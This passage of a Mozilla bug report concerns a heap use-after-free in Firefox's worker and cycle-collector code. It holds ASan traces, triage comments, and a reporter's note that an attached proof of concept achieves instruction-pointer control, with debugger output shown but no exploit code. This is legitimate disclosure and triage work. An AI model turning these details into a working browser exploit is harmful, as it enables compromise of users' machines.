    #15 0x7faeef98a456 in mozilla::dom::(anonymous namespace)::ScriptExecutorRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:1989:10
    #16 0x7faeef9c9f82 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #17 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7faeef9b904e in mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3646:7
    #20 0x7faeef95b555 in Run /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:1169:27
    #21 0x7faeef95b555 in mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray&lt;mozilla::dom::(anonymous namespace)::ScriptLoadInfo&gt;&amp;, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&amp;) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2149
    #22 0x7faeef95a972 in mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring&lt;char16_t&gt; const&amp;, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&amp;) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2259:3
    #23 0x7faeef9dd1c5 in mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:340:5
    #24 0x7faeef9c9f82 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #25 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #26 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #27 0x7faeef9b07ea in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2748:7
    #28 0x7faeef978f0b in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40
    #29 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #30 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #31 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #32 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #33 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #34 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #35 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11

Thread T22 (DOM Worker) created by T0 (Web Content) here:
    #0 0x55c5c6449add in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3
    #1 0x7faf08840158 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14
    #2 0x7faf08829d3e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12
    #3 0x7faee7db3609 in nsThread::Init(nsTSubstring&lt;char&gt; const&amp;) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8
    #4 0x7faeef9d9388 in mozilla::dom::WorkerThread::Create(mozilla::dom::WorkerThreadFriendKey const&amp;) /builds/worker/workspace/build/src/dom/workers/WorkerThread.cpp:93:7
    #5 0x7faeef94df79 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1433:14
    #6 0x7faeef94c595 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1298:19
    #7 0x7faeef9aa8a3 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring&lt;char16_t&gt; const&amp;, bool, mozilla::dom::WorkerType, nsTSubstring&lt;char16_t&gt; const&amp;, nsTSubstring&lt;char&gt; const&amp;, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&amp;) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2250:24
    #8 0x7faeef95c7b7 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&amp;, nsTSubstring&lt;char16_t&gt; const&amp;, mozilla::dom::WorkerOptions const&amp;, mozilla::ErrorResult&amp;) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41
    #9 0x7faeecfab3d0 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52
    #10 0x7faef4007905 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #11 0x7faef4007905 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #12 0x7faef4007905 in InternalConstruct(JSContext*, js::AnyConstructArgs const&amp;) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #13 0x7faef3fe4f1c in Interpret(JSContext*, js::RunState&amp;) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3063:16
    #14 0x7faef3fced88 in js::RunScript(JSContext*, js::RunState&amp;) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #15 0x7faef4009ef9 in js::ExecuteKernel(JSContext*, JS::Handle&lt;JSScript*&gt;, JSObject&amp;, JS::Value const&amp;, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #16 0x7faef400a66c in js::Execute(JSContext*, JS::Handle&lt;JSScript*&gt;, JSObject&amp;, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #17 0x7faef428491d in ExecuteScript(JSContext*, JS::Handle&lt;JS::StackGCVector&lt;JSObject*, js::TempAllocPolicy&gt; &gt;, JS::Handle&lt;JSScript*&gt;, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:455:10
    #18 0x7faeeb5b26a4 in nsJSUtils::ExecutionContext::ExecScript() /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:386:8
    #19 0x7faeefe21ef3 in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::ScriptLoadRequest*, nsJSUtils::ExecutionContext&amp;) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2495:16
    #20 0x7faeefe1efb1 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2715:20
    #21 0x7faeefe1794c in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2222:10
    #22 0x7faeefe14322 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1803:10
    #23 0x7faeefdee73e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1526:10
    #24 0x7faeefdeda0e in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:118:18
    #25 0x7faeea1249ba in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:224:18
    #26 0x7faeea1249ba in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:727
    #27 0x7faeea11e663 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:530:7
    #28 0x7faeea12a7e0 in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:133:18
    #29 0x7faee7d86141 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32
    #30 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #31 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #32 0x7faee8e00c3a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21
    #33 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #34 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #35 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #36 0x7faef0180599 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27
    #37 0x7faef3d7bc9f in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20
    #38 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #39 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #40 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #41 0x7faef3d7b646 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34
    #42 0x55c5c64943a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28
    #43 0x55c5c64943a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263
    #44 0x7faf0743682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:331:7 in ~nsCOMPtr_base
Shadow bytes around the buggy address:
  0x0c2480012050: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2480012060: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2480012070: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c2480012080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c2480012090: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
=&gt;0x0c24800120a0: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd
  0x0c24800120b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c24800120c0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x0c24800120d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c24800120e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c24800120f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==7061==ABORTING
</code></pre>
</div></div><div class="change-set" id="c1"><div class="comment" data-id="14062029" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" ><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-17 23:03 PDT" data-time="1555567423">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-1" data-comment-id="14062029" data-ismarkdown="true" ><p>I can reproduce on a windows nightly asan build after letting the testcase reload loop run for a bit (sometimes it crashes quickly, sometimes takes a while). The stack on the crashing thread I get is a little different, but still a UAF read of 8 bytes somewhere in the CycleCollector. The allocation and freed stacks are the same as shown here.</p>
<p>Doesn&#39;t crash on an opt build. Haven&#39;t tried a debug build to see if there are any interesting assertions firing.</p>
</div><div class="activity"><div class="change">Group: core-security &rarr; dom-core-security</div><div class="change">Flags: sec-bounty?</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-uaf&amp;resolution=---">csectype-uaf</a>, 
          
            <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a></div></div></div><div class="change-set" id="c2"><div class="comment" data-id="14062288" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_506912" ><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_506912" ><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-18 03:24 PDT" data-time="1555583058">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9059231"
         class="attachment"
         data-id="9059231" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="UAF_NoteXPCOMChild_EIP_41414141.js">
      <meta itemprop="contentSize" content="2242">
      <meta itemprop="encodingFormat" content="text/javascript">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9059231" itemprop="contentUrl">
        <span id="att-9059231-description" itemprop="description">UAF_NoteXPCOMChild_EIP_41414141.js</span></a>
        — <a href="attachment.cgi?id=9059231&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-2" data-comment-id="14062288" data-ismarkdown="true" ><p>Attached a PoC ( UAF_NoteXPCOMChild_EIP_41414141.js ) with EIP control on 32 bit Firefox.</p>
<p>Firefox version: 68.0a1 (2019-04-17) (32-bit)<br>
OS: Windows 10</p>
<p>(1440.6678): Access violation - code c0000005 (!!! second chance !!!)<br>
eax=12c2d920 ebx=13daf0b4 ecx=e5e5e5e5 edx=14da0000 esi=14da0000 edi=14a2e090<br>
eip=41414141 esp=13daf094 ebp=13daf0c8 iopl=0         nv up ei pl nz na po nc<br>
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202<br>
41414141 ??              ???<br>
3:232&gt; r<br>
eax=12c2d920 ebx=13daf0b4 ecx=e5e5e5e5 edx=14da0000 esi=14da0000 edi=14a2e090<br>
eip=41414141 esp=13daf094 ebp=13daf0c8 iopl=0         nv up ei pl nz na po nc<br>
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202<br>
41414141 ??              ???<br>
3:232&gt; k</p>
<h1>ChildEBP RetAddr</h1>
<p>WARNING: Frame IP not in any known module. Following frames may be wrong.<br>
00 13daf090 5a4a77b3 0x41414141<br>
01 13daf0c8 5a49a108 xul!CCGraphBuilder::NoteXPCOMChild+0x53 [z:\task_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2155]<br>
02 13daf238 5a499ebe xul!mozilla::CycleCollectedJSRuntime::TraverseGCThing+0x238 [z:\task_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 693]<br>
03 13daf254 5a4a7221 xul!mozilla::JSGCThingParticipant::TraverseNative+0x2e [z:\task_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 359]<br>
04 13daf288 5a4a9507 xul!CCGraphBuilder::BuildGraph+0x91 [z:\task_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2061]<br>
05 13daf2a0 5a4a9b5c xul!nsCycleCollector::MarkRoots+0x37 [z:\task_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2672]<br>
06 13daf380 5a4acc23 xul!nsCycleCollector::Collect+0x26c [z:\task_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 3423]<br>
07 13daf3e4 5bf9624a xul!nsCycleCollector_collect+0x53 [z:\task_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 3948]<br>
08 13daf3f0 5a49a949 xul!mozilla::dom::workerinternals::<code>anonymous namespace&#39;::WorkerJSRuntime::CustomGCCallback+0x1a [z:\task_1555535245\build\src\dom\workers\RuntimeService.cpp @ 909] 09 13daf41c 5992dd1f xul!mozilla::CycleCollectedJSRuntime::GCCallback+0x109 [z:\task_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 797] 0a 13daf43c 5992e1c1 xul!js::gc::GCRuntime::maybeCallGCCallback+0xdf [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7377] 0b 13daf4c8 5992ec84 xul!js::gc::GCRuntime::gcCycle+0x401 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7466] 0c 13daf568 59916c59 xul!js::gc::GCRuntime::collect+0x144 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7623] 0d 13daf600 598c4254 xul!js::gc::GCRuntime::gc+0xb9 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7712] 0e 13daf618 5bf9590a xul!JS_GC+0x24 [z:\task_1555535245\build\src\js\src\jsapi.cpp @ 1189] 0f 13daf6a4 58df966c xul!mozilla::dom::workerinternals::</code>anonymous namespace&#39;::WorkerThreadPrimaryRunnable::Run+0xba [z:\task_1555535245\build\src\dom\workers\RuntimeService.cpp @ 2325]<br>
10 13dafb88 58df915b xul!nsThread::ProcessNextEvent+0x44c [z:\task_1555535245\build\src\xpcom\threads\nsThread.cpp @ 1180]<br>
11 13dafbac 58df8f20 xul!NS_ProcessNextEvent+0x2b [z:\task_1555535245\build\src\xpcom\threads\nsThreadUtils.cpp @ 486]<br>
12 13dafbd8 58dd0764 xul!mozilla::ipc::MessagePumpForNonMainThreads::Run+0x100 [z:\task_1555535245\build\src\ipc\glue\MessagePump.cpp @ 333]<br>
13 13dafc10 58df8553 xul!MessageLoop::RunHandler+0x44 [z:\task_1555535245\build\src\ipc\chromium\src\base\message_loop.cc @ 309]<br>
14 13dafc48 66db8906 xul!nsThread::ThreadFunc+0x173 [z:\task_1555535245\build\src\xpcom\threads\nsThread.cpp @ 454]<br>
15 13dafc78 66da7e0d nss3!_PR_NativeRunThread+0x116 [z:\task_1555535245\build\src\nsprpub\pr\src\threads\combined\pruthr.c @ 397]<br>
16 13dafc84 74f10f5f nss3!pr_root+0xd [z:\task_1555535245\build\src\nsprpub\pr\src\md\windows\w95thred.c @ 137]<br>
17 13dafcc0 76518494 ucrtbase!thread_start&lt;unsigned int (__stdcall*)(void *)&gt;+0x3f<br>
18 13dafcd4 6824638b KERNEL32!BaseThreadInitThunk+0x24<br>
19 13dafd0c 77bc41c8 mozglue!patched_BaseThreadInitThunk+0x8b [z:\task_1555535245\build\src\mozglue\build\WindowsDllBlocklist.cpp @ 705]<br>
1a 13dafd54 77bc4198 ntdll!__RtlUserThreadStart+0x2f<br>
1b 13dafd64 00000000 ntdll!_RtlUserThreadStart+0x1b</p>
</div></div><div class="change-set" id="a1252758_621888"><div class="change" id="aa1252758_621888">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_621888" id="a1252758_621888"><img src="https://secure.gravatar.com/avatar/ce4b8df294aef146c65ea1a5a2fca66c?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_621888" id="a1252758_621888"><a class="email " href="/user_profile?user_id=621888" > <span class="fna">Yaron Tausky [:ytausky]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1252758_621888"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1252758_621888">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a1252758_621888">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-05-02 09:43 PDT" data-time="1556815433">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: nobody &rarr; ytausky</div></div></div><div class="change-set" id="c3"><div class="comment" data-id="14093641" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_621888" id="a1252758_621888"><img src="https://secure.gravatar.com/avatar/ce4b8df294aef146c65ea1a5a2fca66c?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_621888" id="a1252758_621888"><a class="email " href="/user_profile?user_id=621888" > <span class="fna">Yaron Tausky [:ytausky]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-05-03 05:56 PDT" data-time="1556888169">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-3" data-comment-id="14093641" data-ismarkdown="true" ><p>Running this with assertions enabled and ASAN on, I get this assertion failure:</p>
<pre><code>Assertion failure: !mCancelAllPendingRunnables, at /Users/yarontausky/src/gecko/dom/workers/WorkerPrivate.cpp:3294
#01: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb811fa8]
#02: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8114d1]
#03: mozilla::dom::XMLHttpRequestWorker::SendInternal(mozilla::dom::SendRunnable*, mozilla::ErrorResult&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xbe038cd]
#04: mozilla::dom::XMLHttpRequestWorker::Send(JSContext*, mozilla::dom::Nullable&lt;mozilla::dom::DocumentOrBlobOrArrayBufferViewOrArrayBufferOrFormDataOrURLSearchParamsOrUSVString&gt; const&amp;, mozilla::ErrorResult&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xbe07c90]
#05: mozilla::dom::XMLHttpRequest_Binding::send(JSContext*, JS::Handle&lt;JSObject*&gt;, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x7b63faf]
#06: bool mozilla::dom::binding_detail::GenericMethod&lt;mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions&gt;(JSContext*, unsigned int, JS::Value*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x8b8aa1d]
#07: CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11713d3b]
#08: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&amp;, js::MaybeConstruct)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11711c8f]
#09: Interpret(JSContext*, js::RunState&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x116e9c9d]
#10: js::RunScript(JSContext*, js::RunState&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x116c7a5e]
#11: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&amp;, js::MaybeConstruct)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11711c34]
#12: js::Call(JSContext*, JS::Handle&lt;JS::Value&gt;, JS::Handle&lt;JS::Value&gt;, js::AnyInvokeArgs const&amp;, JS::MutableHandle&lt;JS::Value&gt;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1171588d]
#13: JS::Call(JSContext*, JS::Handle&lt;JS::Value&gt;, JS::Handle&lt;JS::Value&gt;, JS::HandleValueArray const&amp;, JS::MutableHandle&lt;JS::Value&gt;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x12a77a58]
#14: mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle&lt;JS::Value&gt;, mozilla::dom::Event&amp;, JS::MutableHandle&lt;JS::Value&gt;, mozilla::ErrorResult&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x7f6fc43]
#15: void mozilla::dom::EventHandlerNonNull::Call&lt;nsCOMPtr&lt;mozilla::dom::EventTarget&gt; &gt;(nsCOMPtr&lt;mozilla::dom::EventTarget&gt; const&amp;, mozilla::dom::Event&amp;, JS::MutableHandle&lt;JS::Value&gt;, mozilla::ErrorResult&amp;, char const*, mozilla::dom::CallbackObject::ExceptionH[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95e2940]
#16: mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95df712]
#17: mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x958dea3]
#18: mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x958fdd0]
